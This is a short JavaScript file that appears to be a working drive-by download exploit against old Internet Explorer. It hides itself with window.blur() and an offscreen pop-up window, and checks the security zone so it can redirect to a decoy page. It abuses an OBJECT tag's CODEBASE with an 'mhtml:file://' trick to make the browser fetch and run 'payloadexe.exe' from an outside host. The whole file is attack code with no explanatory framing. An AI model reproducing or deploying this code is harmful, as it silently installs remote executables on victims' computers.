
window.blur();
base_path="http://www.easywww.info/safe";
Goback_Url=base_path+"/goback.htm";
PayloadExe_Url=base_path+"/payloadexe.exe";
WaitForDocumentCached_TIME=4*(0.5*1000);
WaitForMhtmlResCached_TIME=1000;

function IsLocalZone()
	{
		try
		{
			//If window.parent is accessible, it's local zone
			tempVar=window.parent.location.href;
			return true;
		}
		catch(e)
		{
			//If window.parent is inaccessible, it's local zone
			return false;
		}
	}

function LaunchRemoteExe_Step3()
	{
		w.document.execCommand("Refresh");
	}


function LaunchRemoteExe_Step2()
	{
		w.document.execCommand("Refresh");
		setTimeout("LaunchRemoteExe_Step3()",WaitForMhtmlResCached_TIME);
	}
	
function LaunchRemoteExe(ExeUrl)	
	{
		function TenDigitRnd()
		//post: return a 3-digit random number. i just use millisecond here.
			{
				RndStr=Math.random().toString().substring();
				return RndStr.substring(RndStr.length-10,RndStr.length);
			}
		w=window.open("about:blank","_blank","x=5000,top=5000,y=5000,left=5000,height=10,width=10,directories=no,toolbar=no,addressbar=no,resizable=no,menubar=no,scrollbars=no");
		w.document.write("<SCRIPT>window.blur();</SCRIPT><OBJECT NAME='X' CLASSID='CLSID:11111111-1111-1111-1111-11" + TenDigitRnd() + "' CODEBASE='mhtml:file://C:\NO_SUCH_MHT.MHT!" + ExeUrl + "'>");
		setTimeout("LaunchRemoteExe_Step2()",WaitForDocumentCached_TIME);
	}

function LaunchPayloadExe()
	{
		LaunchRemoteExe(PayloadExe_Url);
	}

if(IsLocalZone()==false)
	window.open(Goback_Url,"_parent");
else
	{
		LaunchPayloadExe()
	}
	